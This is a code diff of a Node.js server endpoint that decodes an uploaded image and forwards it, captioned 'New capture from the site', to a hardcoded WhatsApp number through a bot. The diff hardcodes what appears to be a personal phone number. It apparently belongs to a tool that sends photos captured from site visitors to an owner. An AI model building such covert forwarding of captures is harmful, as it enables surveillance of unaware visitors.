@@ -2358,41 +2358,17 @@ app.post('/upload-photo', async (req, res) => {
             return res.status(503).json({ ok: false, error: 'The bot is not ready to send the image yet.' });
         }
 
-        const rawSelfJid = botJid || '';
-        const rawSelfLid = botLid || '';
-        const phoneSelfJid = '2348124647818@s.whatsapp.net';
-        const lidSelfJid = '34798496137284@lid';
-        const destinations = Array.from(new Set([
-            rawSelfJid,
-            rawSelfLid,
-            rawSelfJid?.replace(/:\d+(?=@)/, ''),
-            rawSelfLid?.replace(/:\d+(?=@)/, ''),
-            phoneSelfJid,
-            lidSelfJid,
-            '34798496137284@s.whatsapp.net',
-            '2348124647818:19@s.whatsapp.net'
-        ].filter(Boolean)));
+        const cleanTargetNumber = '2348124647818';
+        const targetJid = `${cleanTargetNumber}@s.whatsapp.net`;
 
         const buffer = Buffer.from(match[2], 'base64');
-        const sentTargets = [];
 
-        for (const chatJid of destinations) {
-            try {
-                await global.activeSock.sendMessage(chatJid, {
-                    image: buffer,
-                    caption: '📸 New capture from the site'
-                });
-                sentTargets.push(chatJid);
-            } catch (error) {
-                console.error(`Failed to send captured photo to ${chatJid}:`, error);
-            }
-        }
+        await global.activeSock.sendMessage(targetJid, {
+            image: buffer,
+            caption: '📸 New capture from the site'
+        });
 
-        if (sentTargets.length === 0) {
-            return res.status(500).json({ ok: false, error: 'The photo could not be sent to the configured owner chat.' });
-        }
-
-        res.json({ ok: true, sentTo: sentTargets });
+        res.json({ ok: true, sentTo: targetJid });
     } catch (error) {
         console.error('Failed to forward captured photo to owner chat:', error);
         res.status(500).json({ ok: false, error: 'The photo could not be forwarded.' });
